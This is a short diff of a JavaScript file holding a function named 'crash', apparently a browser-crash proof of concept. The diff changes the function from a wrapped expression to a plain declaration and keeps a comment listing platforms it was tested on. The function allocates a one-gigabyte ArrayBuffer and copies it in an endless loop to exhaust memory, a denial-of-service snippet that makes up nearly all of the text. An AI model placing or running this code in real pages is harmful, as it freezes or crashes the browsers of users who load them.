@@ -1,7 +1,7 @@
-(function crash(){
+function crash(){
 	buff = new ArrayBuffer(1073741824);
 	while(true) buff.slice(0, buff.byteLength);
-});
+};
 /*
 	Tested on the following:
 	Linux mint - not working
